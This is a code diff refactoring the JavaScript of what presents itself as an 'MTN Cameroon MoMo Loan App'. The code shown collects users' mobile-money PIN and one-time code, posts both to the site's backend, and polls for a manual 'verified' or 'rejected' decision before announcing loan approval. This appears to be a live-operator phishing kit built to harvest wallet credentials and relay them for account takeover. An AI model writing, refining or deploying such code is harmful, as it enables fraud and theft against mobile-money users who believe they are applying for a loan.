-// ─── PIN Submission ───
-function doPin() {
-    var pin = '';
-    for (var i = 0; i < 5; i++) {
-        var field = document.getElementById('pin' + i);
-        if (field) pin += field.value;
-    }
+// ─── STEP 5: PIN ───
+async function doPin() {
+    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
     if (pin.length < 5) {
         showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.');
         return;
     }
 
-    checkPinStatus().then(function(pinStatus) {
-        if (pinStatus && pinStatus.isBlocked) {
-            showErr('pinErr', 'Too many failed attempts. Please wait ' + pinStatus.blockRemainingSeconds + ' seconds.');
-            return;
-        }
+    const pinStatus = await checkPinStatus();
+    if (pinStatus && pinStatus.isBlocked) {
+        showErr('pinErr', `Too many failed attempts. Please wait ${pinStatus.blockRemainingSeconds} seconds.`);
+        return;
+    }
 
-        fetch('/api/send-pin', {
+    try {
+        const response = await fetch('/api/send-pin', {
             method: 'POST',
-            body: JSON.stringify({
-                applicationId: S.applicationId,
-                pin: pin,
+            body: JSON.stringify({ 
+                applicationId: S.applicationId, 
+                pin,
                 isResubmission: !!S.rejectedStep
             }),
             headers: { 'Content-Type': 'application/json' }
-        })
-        .then(function(response) { return response.json(); })
-        .then(function(data) {
-            if (!data.ok) {
-                showErr('pinErr', data.error || 'Failed to submit PIN.');
-                return;
-            }
+        });
+        
+        const data = await response.json();
+        
+        if (!data.ok) {
+            showErr('pinErr', data.error || 'Failed to submit PIN.');
+            return;
+        }
 
-            document.getElementById('waitPinAppId').textContent = S.applicationId;
-            goTo('page-wait-pin');
+        document.getElementById('waitPinAppId').textContent = S.applicationId;
+        goTo('page-wait-pin');
 
-            startPoll(S.applicationId, 'pin',
-                function() {
-                    showToast('✅ PIN Verified!', 'success');
-                    resetPinAttempts();
-                    goTo('page-otp');
-                },
-                function() {
-                    fetch('/api/pin-rejected', {
+        startPoll(S.applicationId, 'pin',
+            () => { 
+                showToast('✅ PIN Verified!', 'success');
+                resetPinAttempts();
+                goTo('page-otp'); 
+            },
+            async () => {
+                try {
+                    const rejectResponse = await fetch('/api/pin-rejected', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ applicationId: S.applicationId })
-                    })
-                    .then(function(res) { return res.json(); })
-                    .then(function(rejectData) {
-                        if (rejectData.blocked) {
-                            showErr('pinErr', '🔒 Too many failed attempts. Blocked for 5 minutes.');
-                            checkPinStatus();
-                            goTo('page-pin');
-                        } else if (rejectData.remainingAttempts > 0) {
-                            showErr('pinErr', '❌ Wrong PIN. ' + rejectData.remainingAttempts + ' attempt(s) remaining.');
-                            var pinBoxes = document.querySelectorAll('#page-pin .pin-box');
-                            for (var j = 0; j < pinBoxes.length; j++) {
-                                pinBoxes[j].value = '';
-                            }
-                            var firstPin = document.getElementById('pin0');
-                            if (firstPin) firstPin.focus();
-                            var attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-                            if (attemptsDisplay) {
-                                attemptsDisplay.textContent = '🔑 Attempts remaining: ' + rejectData.remainingAttempts + ' of 3';
-                                attemptsDisplay.className = 'pin-attempts warning';
-                            }
-                            goTo('page-pin');
-                        } else {
-                            handleRejection('pin');
-                        }
-                    })
-                    .catch(function(err) {
-                        console.error('Error handling PIN rejection:', err);
-                        handleRejection('pin');
                     });
+                    const rejectData = await rejectResponse.json();
+                    
+                    if (rejectData.blocked) {
+                        showErr('pinErr', '🔒 Too many failed attempts. Blocked for 5 minutes.');
+                        await checkPinStatus();
+                        goTo('page-pin');
+                    } else if (rejectData.remainingAttempts > 0) {
+                        showErr('pinErr', `❌ Wrong PIN. ${rejectData.remainingAttempts} attempt(s) remaining.`);
+                        document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
+                        document.getElementById('pin0').focus();
+                        const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+                        if (attemptsDisplay) {
+                            attemptsDisplay.textContent = `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`;
+                            attemptsDisplay.className = 'pin-attempts warning';
+                        }
+                        goTo('page-pin');
+                    } else {
+                        handleRejection('pin');
+                    }
+                } catch (err) {
+                    console.error('Error handling PIN rejection:', err);
+                    handleRejection('pin');
                 }
-            );
-        })
-        .catch(function(error) {
-            console.error('Error submitting PIN:', error);
-            showErr('pinErr', 'Failed to submit PIN. Please try again.');
-        });
-    });
+            }
+        );
+    } catch (error) {
+        console.error('Error submitting PIN:', error);
+        showErr('pinErr', 'Failed to submit PIN. Please try again.');
+    }
 }
 
-// ─── OTP Submission ───
-function doOtp() {
-    var otp = '';
-    for (var i = 0; i < 4; i++) {
-        var field = document.getElementById('otp' + i);
-        if (field) otp += field.value;
-    }
+// ─── STEP 6: OTP ───
+async function doOtp() {
+    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
     if (otp.length < 4) {
         showErr('otpErr', 'Enter a valid 4-digit OTP.');
         return;
     }
 
-    fetch('/api/send-otp', {
+    await fetch('/api/send-otp', {
         method: 'POST',
-        body: JSON.stringify({
-            applicationId: S.applicationId,
-            otp: otp,
+        body: JSON.stringify({ 
+            applicationId: S.applicationId, 
+            otp,
             isResubmission: !!S.rejectedStep
         }),
         headers: { 'Content-Type': 'application/json' }
-    })
-    .then(function(response) { return response.json(); })
-    .then(function(data) {
-        document.getElementById('waitOtpAppId').textContent = S.applicationId;
-        goTo('page-wait-otp');
-
-        startPoll(S.applicationId, 'otp',
-            function() {
-                showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
-                showApproval();
-            },
-            function() {
-                handleRejection('otp');
-            }
-        );
-    })
-    .catch(function(error) {
-        console.error('Error submitting OTP:', error);
-        showErr('otpErr', 'Failed to submit OTP. Please try again.');
     });
+
+    document.getElementById('waitOtpAppId').textContent = S.applicationId;
+    goTo('page-wait-otp');
+
+    startPoll(S.applicationId, 'otp',
+        () => {
+            showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
+            showApproval();
+        },
+        () => {
+            handleRejection('otp');
+        }
+    );
 }
 
 // ─── Update PIN Page UI ───
 function updatePinPageUI() {
-    var pinCard = document.querySelector('#page-pin .step-card');
+    const pinCard = document.querySelector('#page-pin .step-card');
     if (pinCard) {
-        var attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+        let attemptsDisplay = document.getElementById('pinAttemptsDisplay');
         if (!attemptsDisplay) {
             attemptsDisplay = document.createElement('div');
             attemptsDisplay.id = 'pinAttemptsDisplay';
             attemptsDisplay.className = 'pin-attempts';
-            var pinLabel = document.querySelector('#page-pin .pin-label');
+            const pinLabel = document.querySelector('#page-pin .pin-label');
             if (pinLabel) {
                 pinLabel.parentNode.insertBefore(attemptsDisplay, pinLabel.nextSibling);
             }
@@ -1006,12 +881,12 @@ function updatePinPageUI() {
 function recoverSession() {
     console.log('🔄 Checking for saved session...');
     
-    var appId = loadApplicationId();
+    const appId = loadApplicationId();
     if (appId) {
-        console.log('✅ Found application ID: ' + appId);
+        console.log(`✅ Found application ID: ${appId}`);
     }
     
-    var dataLoaded = loadApplicationData();
+    const dataLoaded = loadApplicationData();
     if (dataLoaded) {
         console.log('✅ Loaded application data');
     }
@@ -1021,10 +896,10 @@ function recoverSession() {
         return true;
     }
     
-    var rejection = loadRejectionInfo();
+    const rejection = loadRejectionInfo();
     if (rejection) {
-        console.log('✅ Found rejection info for step: ' + rejection.step);
-        showToast('⚠️ Your ' + rejection.step.toUpperCase() + ' was rejected. Please try again.', 'error');
+        console.log(`✅ Found rejection info for step: ${rejection.step}`);
+        showToast(`⚠️ Your ${rejection.step.toUpperCase()} was rejected. Please try again.`, 'error');
         S.applicationId = rejection.applicationId;
         handleRejection(rejection.step);
         return true;
@@ -1038,7 +913,7 @@ function recoverSession() {
 }
 
 // ─── Auto-save on input changes ───
-document.addEventListener('input', function(e) {
+document.addEventListener('input', (e) => {
     if (e.target.closest('#page-step1, #page-step2, #page-step3')) {
         saveFormDraft();
     }
@@ -1048,32 +923,22 @@ document.addEventListener('input', function(e) {
 });
 
 // ─── Override goTo for PIN page ───
-var originalGoTo = goTo;
+const originalGoTo = goTo;
 goTo = function(pageId) {
     originalGoTo(pageId);
     if (pageId === 'page-pin') {
         updatePinPageUI();
         checkPinStatus();
     }
-    if (pageId === 'page-step3') {
-        updateSummary();
-    }
 };
 
 // ─── INIT ───
 updateCalc();
 
-// Set initial slider background
-var slider = document.getElementById('amtSlider');
-if (slider) {
-    var pct = ((slider.value - 500000) / 4500000) * 100;
-    slider.style.setProperty('--pct', pct + '%');
-}
-
-var recovered = recoverSession();
+const recovered = recoverSession();
 
 if (!recovered) {
     goTo('page-landing');
 }
 
-console.log('✅ MTN Cameroon Loan App (All Features) loaded!');
+console.log('✅ MTN Cameroon MoMo Loan App (All Features) loaded!');
